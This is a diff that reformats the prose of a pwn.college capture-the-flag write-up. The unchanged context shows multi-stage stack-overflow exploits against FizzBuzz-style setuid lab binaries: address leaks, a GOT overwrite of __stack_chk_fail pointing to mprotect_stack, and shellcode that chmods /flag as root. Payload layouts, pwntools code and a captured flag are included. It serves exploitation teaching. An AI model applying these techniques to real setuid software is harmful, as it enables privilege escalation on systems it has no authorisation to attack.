@@ -13923,7 +13923,9 @@ The frame is fixed-size (`sub rsp, 0x90`) and every offset is a compile-time con
             └─────────────────────────────┘
 ```
 
-The `strcpy` primitive uses `arr[11]` as its source pointer. In three of the four branches `arr[11]` is set to a BSS address, statically-linked, already known, tells us nothing about where the stack is. Only the **Buzz branch** (`i % 5 == 0`, `i % 3 != 0`, `i % 15 != 0`) sets `arr[11]` to `(char *)&arr[9] + 4`, a live stack address at `rbp−0x24`. Leaking that value gives us `rbp` and, from there, every address we need.
+The `strcpy` primitive uses `arr[11]` as its source pointer. In three of the four branches `arr[11]` is set to a BSS address, statically-linked, already known, tells us nothing about where the stack is. 
+
+Only the Buzz branch (`i % 5 == 0`, `i % 3 != 0`, `i % 15 != 0`) sets `arr[11]` to `(char *)&arr[9] + 4`, a live stack address at `rbp−0x24`. Leaking that value gives us `rbp` and, from there, every address we need.
 
 Let's look at which condition we have to trigger.
 
@@ -13953,7 +13955,9 @@ flowchart TD
 
 The first Buzz iteration is `i = 5`. We burn iterations 0–4 with dummy newlines and send the Stage 1 payload on `i = 5`.
 
-`printf("You entered: %s\n", input)` starts printing from `rbp−0x5C` and stops at the first NULL byte. For it to reach `arr[11]` at offset `+0x44`, every byte from `+0x00` to `+0x43` must be non-NULL. There is one trap: `arr[9]` HIDWORD at offset `+0x38` initially contains `"\n\0\0\0"`. That `\0` at offset `+0x39` stops `printf` before it reaches the counter or `arr[11]`. The Stage 1 payload must overwrite those four bytes with non-NULL values (e.g. `b"CCCC"`) to bridge the gap. `BYTE4(arr[2]) = 0` runs *after* `printf`, so zeroing input[0] does not interfere with the spill.
+`printf("You entered: %s\n", input)` starts printing from `rbp−0x5C` and stops at the first NULL byte. For it to reach `arr[11]` at offset `+0x44`, every byte from `+0x00` to `+0x43` must be non-NULL. There is one trap: `arr[9]` HIDWORD at offset `+0x38` initially contains `"\n\0\0\0"`. 
+
+That `\0` at offset `+0x39` stops `printf` before it reaches the counter or `arr[11]`. The Stage 1 payload must overwrite those four bytes with non-NULL values (e.g. `b"CCCC"`) to bridge the gap. `BYTE4(arr[2]) = 0` runs *after* `printf`, so zeroing input[0] does not interfere with the spill.
 
 ### Stage 1: Leaking the saved `rbp`
 
@@ -14249,7 +14253,7 @@ int win()
 }
 ```
 
-The vulnerability is `read(0, rbp−0x3C, 0x30)` writing 48 bytes into a buffer at `rbp−0x3C`, which overflows into `src` at `rbp−0x20` (offset +28) and `dest` at `rbp−0x18` (offset +36). After each `read()`, the binary calls `strcpy(dest, src)`, giving us a controlled write-what-where primitive every iteration. The canary at `rbp−0x08` sits at offset +52, safely beyond the 48-byte read limit. NX and Full RELRO rule out shellcode and GOT overwrites, but a `win()` function exists in the binary — we just need to redirect `saved_rip` there.
+The vulnerability is `read(0, rbp−0x3C, 0x30)` writing 48 bytes into a buffer at `rbp−0x3C`, which overflows into `src` at `rbp−0x20` (offset +28) and `dest` at `rbp−0x18` (offset +36). After each `read()`, the binary calls `strcpy(dest, src)`, giving us a controlled write-what-where primitive every iteration. The canary at `rbp−0x08` sits at offset +52, safely beyond the 48-byte read limit. NX and Full RELRO rule out shellcode and GOT overwrites, but a `win()` function exists in the binary, we just need to redirect `saved_rip` there.
 
 The frame layout:
 
@@ -14261,7 +14265,7 @@ The frame layout:
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x3C (+16)  │  read buffer              │ read() lands here; buf[0] zeroed after printf
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x2C (+16)  │  "Buzz\n\0"               │ Buzz branch src — THE STACK LEAK
+           rbp−0x2C (+16)  │  "Buzz\n\0"               │ Buzz branch src, THE STACK LEAK
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x24 (+24)  │  loop counter i (DWORD)   │ NULL bytes block printf; bridge with 0xFFFFFFFF
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -14307,9 +14311,9 @@ flowchart TD
 
 The first Buzz iteration is `i = 5`. We burn iterations 0–4 with dummy newlines and send the Stage 1 payload on `i = 5`.
 
-`printf("You entered: %s\n", rbp−0x3C)` starts printing from the read buffer and stops at the first NULL byte. For it to reach `src` at offset +28, every byte from +0 to +27 must be non-NULL. The loop counter at offset +24 is the obstacle: for `i = 5`, those four bytes are `05 00 00 00` — the `\0` at offset +25 stops `printf` before it reaches `src`. We overwrite the counter with `p32(0xFFFFFFFF)` (all `0xFF`, non-NULL), which simultaneously bridges the NULL gap and wraps the counter: `−1 + 1 = 0`, restarting the loop at `i = 0` (FizzBuzz).
+`printf("You entered: %s\n", rbp−0x3C)` starts printing from the read buffer and stops at the first NULL byte. For it to reach `src` at offset +28, every byte from +0 to +27 must be non-NULL. The loop counter at offset +24 is the obstacle: for `i = 5`, those four bytes are `05 00 00 00`, the `\0` at offset +25 stops `printf` before it reaches `src`. We overwrite the counter with `p32(0xFFFFFFFF)` (all `0xFF`, non-NULL), which simultaneously bridges the NULL gap and wraps the counter: `−1 + 1 = 0`, restarting the loop at `i = 0` (FizzBuzz).
 
-The branch sets `src` **before** `read()`. Sending exactly 28 bytes — filling offsets 0–27 and leaving `src` at offset +28 untouched — means `printf` spills those 6 non-NULL bytes of the branch-assigned pointer.
+The branch sets `src` **before** `read()`. Sending exactly 28 bytes, filling offsets 0–27 and leaving `src` at offset +28 untouched, means `printf` spills those 6 non-NULL bytes of the branch-assigned pointer.
 
 ### Stage 1: Leaking `rbp`
 
@@ -14326,7 +14330,7 @@ Stage 1 payload on `i = 5` (Buzz branch):
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x34 (+08)  │  41 41 41 41 41 41 41 41  │ "AAAAAAAA"
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x2C (+16)  │  41 41 41 41 41 41 41 41  │ "AAAAAAAA" — overwrites "Buzz\n"
+           rbp−0x2C (+16)  │  41 41 41 41 41 41 41 41  │ "AAAAAAAA", overwrites "Buzz\n"
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x24 (+24)  │  ff ff ff ff              │ counter = −1, gap bridged
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -14375,7 +14379,7 @@ Stage 3 payload layout (44 bytes, canary at offset +52 never touched):
 ```
 +0       \x90             zeroed by binary after printf, harmless
 +1..+8   win_addr         8 bytes: strcpy source data
-+9       \x00             NULL terminator — strcpy stops after 6 meaningful bytes
++9       \x00             NULL terminator, strcpy stops after 6 meaningful bytes
 +10..+23 b"A" × 14        filler
 +24..+27 p32(16)          counter = 16, loop exits immediately
 +28..+35 p64(rbp−0x3B)   src -> points to win_addr bytes above
@@ -14576,7 +14580,7 @@ void challenge(void) {
         else if (i % 3 == 0)
             src = (char *)&fizz;              // binary_base+0x4078
         else if (i % 5 == 0)
-            src = buzz;                        // rbp−0x2C — THE STACK LEAK
+            src = buzz;                        // rbp−0x2C, THE STACK LEAK
         else
             src = (char *)&nothing;           // binary_base+0x4088
 
@@ -14596,7 +14600,7 @@ void challenge(void) {
 
 The vulnerability is `read(0, rbp−0x3C, 0x54)` writing 84 bytes into a buffer at `rbp−0x3C`. After 28 bytes it reaches `src` at `rbp−0x20`, after 36 bytes it reaches `dest` at `rbp−0x18`, after 52 bytes it reaches the canary at `rbp−0x08`, and after 68 bytes it reaches `saved_rip` at `rbp+0x08`. After each `read()`, the binary calls `strcpy(dest, src)`, giving us a controlled write-what-where primitive every iteration.
 
-NX blocks direct shellcode execution, but **Partial RELRO** leaves the GOT writable. `mprotect_stack` is a dead function in the binary (never called normally) that calls `mprotect(page, 0x1000, RWX)` on its own stack page, making the stack executable. By overwriting `__stack_chk_fail@GOT` with the address of `mprotect_stack`, we repurpose the canary check: a deliberate canary corruption calls `mprotect_stack` instead of `abort`, then returns back into the epilogue — where `leave; ret` redirects execution into our shellcode.
+NX blocks direct shellcode execution, but **Partial RELRO** leaves the GOT writable. `mprotect_stack` is a dead function in the binary (never called normally) that calls `mprotect(page, 0x1000, RWX)` on its own stack page, making the stack executable. By overwriting `__stack_chk_fail@GOT` with the address of `mprotect_stack`, we repurpose the canary check: a deliberate canary corruption calls `mprotect_stack` instead of `abort`, then returns back into the epilogue, where `leave; ret` redirects execution into our shellcode.
 
 The frame layout:
 
@@ -14604,7 +14608,7 @@ The frame layout:
                            ┌───────────────────────────┐
            rbp−0x3C (+00)  │  read buffer (84 bytes)   │ read() lands here; buf[0] zeroed after printf
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x2C (+16)  │  "Buzz\n\0\0\0"           │ Buzz branch src — THE STACK LEAK
+           rbp−0x2C (+16)  │  "Buzz\n\0\0\0"           │ Buzz branch src, THE STACK LEAK
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x24 (+24)  │  loop counter i (DWORD)   │ NULL bytes block printf; bridge with 0xFFFFFFFF
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -14666,7 +14670,7 @@ Stage 1 payload on `i = 5` (Buzz branch):
 
 ```
 +0   b"A" × 16       pad to offset +16
-+16  b"BUZZ"         overwrite "Buzz" — non-NULL, keeps printf flowing
++16  b"BUZZ"         overwrite "Buzz", non-NULL, keeps printf flowing
 +20  b"CCCC"         overwrite "\n\0" gap at offset +20
 +24  p32(0xFFFFFFFF) bridge counter NULLs, wrap loop to i=0
 ```
@@ -14679,9 +14683,9 @@ Stage 1 payload on `i = 5` (Buzz branch):
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x34 (+08)  │  41 41 41 41 41 41 41 41  │ "AAAAAAAA"
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x2C (+16)  │  42 55 5a 5a              │ "BUZZ" — non-NULL, gap bridged
+           rbp−0x2C (+16)  │  42 55 5a 5a              │ "BUZZ", non-NULL, gap bridged
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x28 (+20)  │  43 43 43 43              │ "CCCC" — plugs "\n\0" gap
+           rbp−0x28 (+20)  │  43 43 43 43              │ "CCCC", plugs "\n\0" gap
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x24 (+24)  │  ff ff ff ff              │ counter = −1, all non-NULL
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -14710,7 +14714,7 @@ After this iteration the counter increments: `−1 + 1 = 0`. The next iteration 
 
 ### Stage 2: Leaking `binary_base`
 
-At `i = 0` (FizzBuzz), `src` is set to `&fuzzbuzz = binary_base + 0x4080`. Same bridge trick — `b"A"×24 + p32(0xFFFFFFFF)` — `printf` spills 6 bytes of `&fuzzbuzz`, and the loop wraps to `i = 0` again.
+At `i = 0` (FizzBuzz), `src` is set to `&fuzzbuzz = binary_base + 0x4080`. Same bridge trick, `b"A"×24 + p32(0xFFFFFFFF)`, `printf` spills 6 bytes of `&fuzzbuzz`, and the loop wraps to `i = 0` again.
 
 ```python
 raw         = p.recvn(35)
@@ -14725,7 +14729,7 @@ mprotect_stack  = binary_base + 0x1269
 
 This stage exploits the `strcpy` primitive directly to leak a GOT entry. We set `src = puts@GOT` (which holds `puts@libc`) and `dest = buffer_start+1` (inside our own read buffer). `strcpy(buffer_start+1, puts@GOT)` copies the 6 non-NULL bytes of the `puts` libc address into the buffer, and the immediately following `printf("Correct answer: %s\n", dest)` prints them back to us.
 
-Stage 2.5 payload on `i = 0` (FizzBuzz, counter set to 0 — no loop wrap):
+Stage 2.5 payload on `i = 0` (FizzBuzz, counter set to 0, no loop wrap):
 
 ```
 +0..+23  b"A" × 24         filler
@@ -14742,13 +14746,13 @@ libc_base   = leaked_puts - PUTS_LIBC_OFF    # PUTS_LIBC_OFF = 0x084420
 
 ### Stage 3: Overwriting `__stack_chk_fail@GOT` → `mprotect_stack`
 
-At `i = 1` (nothing), the branch-assigned `src` points into the binary and is irrelevant — we overwrite both `src` and `dest` ourselves. We place the bytes of `mprotect_stack` at `buffer_start+1` and point `dest` at `__stack_chk_fail@GOT`. `strcpy` copies the 6 non-NULL low bytes; the high two bytes of the GOT slot are already `0x00`, so the full 8-byte address is correct after the write.
+At `i = 1` (nothing), the branch-assigned `src` points into the binary and is irrelevant, we overwrite both `src` and `dest` ourselves. We place the bytes of `mprotect_stack` at `buffer_start+1` and point `dest` at `__stack_chk_fail@GOT`. `strcpy` copies the 6 non-NULL low bytes; the high two bytes of the GOT slot are already `0x00`, so the full 8-byte address is correct after the write.
 
 Stage 3 payload on `i = 1` (nothing):
 
 ```
 +0       \x90                  zeroed by binary, harmless
-+1..+8   p64(mprotect_stack)   src data — 6 non-NULL bytes + natural NULL
++1..+8   p64(mprotect_stack)   src data, 6 non-NULL bytes + natural NULL
 +9..+23  b"\x00" × 15          pad (NULLs fine here, delivered via read())
 +24..+27 p32(1)                counter = 1, next iteration is i=2 (nothing)
 +28..+35 p64(buffer_start+1)   src -> &mprotect_stack bytes
@@ -14783,7 +14787,7 @@ strcpy(__stack_chk_fail@GOT, buffer_start+1) fires
 
 At `i = 2` (nothing), we send a single 84-byte payload that does everything at once: plants shellcode in the buffer, sets a harmless `strcpy` target so the primitive fires without damage, deliberately corrupts the canary to trigger `__stack_chk_fail@GOT` (now `mprotect_stack`), and overwrites `saved_rip` with the shellcode entry point.
 
-The 27-byte shellcode calls `chmod("/flag", 0o777)` then `exit(0)` via raw syscalls. Because no shell is spawned, the `setuid` EUID=0 is never dropped — `chmod` succeeds as root.
+The 27-byte shellcode calls `chmod("/flag", 0o777)` then `exit(0)` via raw syscalls. Because no shell is spawned, the `setuid` EUID=0 is never dropped, `chmod` succeeds as root.
 
 Stage 4 payload on `i = 2` (nothing):
 
@@ -14794,7 +14798,7 @@ Stage 4 payload on `i = 2` (nothing):
 +36..+43 p64(harmless)             dest -> same harmless target
 +44..+49 b"/flag\x00"              chmod path argument, at buffer_start+44
 +50..+51 b"\x00\x00"               padding
-+52..+59 b"\xde\xad\xbe\xef" × 2  corrupt canary — triggers __stack_chk_fail
++52..+59 b"\xde\xad\xbe\xef" × 2  corrupt canary, triggers __stack_chk_fail
 +60..+67 p64(buffer_start)         saved RBP (any writable address)
 +68..+75 p64(buffer_start+1)       saved RIP <- shellcode entry
 +76..+83 b"\x00" × 8               padding
@@ -14823,7 +14827,7 @@ counter increments to 16 -> loop exits (16 ≥ loop limit 16)
 challenge() epilogue: canary check fires
   [rbp−0x8] = 0xdeadbeefdeadbeef ≠ fs:0x28
   -> call __stack_chk_fail@plt   (now = mprotect_stack)
-  -> mprotect_stack: mprotect(page, 0x1000, RWX) — stack is now executable
+  -> mprotect_stack: mprotect(page, 0x1000, RWX), stack is now executable
   -> mprotect_stack returns
   -> leave: RSP = rbp+8  (saved_rip slot)
   -> ret:   RIP = buffer_start+1  (shellcode entry)
@@ -14974,4 +14978,4 @@ hacker@dojo.pwn.college:~$ cat /flag
 pwn.college{Ih-Vn6xQaGqEhcNpfdSYYuSP7Z-.QXzUDO4EDL4ITM0EzW}
 ```
 
-The SIGSEGV at exit is expected: the shellcode calls `SYS_exit`, pwnlib reports the abnormal termination. The `chmod("/flag", 0o777)` syscall ran as EUID=0 before that, so `/flag` is world-readable when Python checks it. `system("/bin/sh")` would not work here — modern dash/bash detect `RUID ≠ EUID` and drop setuid privileges before executing. The raw `chmod` syscall in shellcode bypasses the shell entirely and succeeds.
+The SIGSEGV at exit is expected: the shellcode calls `SYS_exit`, pwnlib reports the abnormal termination. The `chmod("/flag", 0o777)` syscall ran as EUID=0 before that, so `/flag` is world-readable when Python checks it. `system("/bin/sh")` would not work here, modern dash/bash detect `RUID ≠ EUID` and drop setuid privileges before executing. The raw `chmod` syscall in shellcode bypasses the shell entirely and succeeds.
